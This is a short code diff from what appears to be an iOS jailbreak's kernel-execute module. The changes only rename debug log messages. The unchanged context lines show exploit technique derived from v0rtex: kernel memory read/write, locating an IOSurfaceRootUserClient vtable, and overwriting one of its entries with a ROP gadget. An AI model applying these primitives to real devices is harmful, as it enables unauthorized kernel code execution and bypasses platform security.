@@ -37,12 +37,12 @@ static uint64_t fake_client;
 const int fake_kalloc_size = 0x1000;
 
 void init_kexecute(void) {
-    NSLog(@"1");
+    NSLog(@"kexecute 1");
     user_client = prepare_user_client();
-    NSLog(@"4");
+    NSLog(@"kexecute 4");
     // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
     IOSurfaceRootUserClient_port = find_port(user_client); // UserClients are just mach_ports, so we find its address
-    NSLog(@"5");
+    NSLog(@"kexecute 5");
     IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
     
     uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
@@ -74,9 +74,9 @@ void init_kexecute(void) {
     
     // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
     wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
-    NSLog(@"7");
+    NSLog(@"kexecute 7");
     pthread_mutex_init(&kexecute_lock, NULL);
-    NSLog(@"8");
+    NSLog(@"kexecute 8");
 }
 
 void term_kexecute(void) {
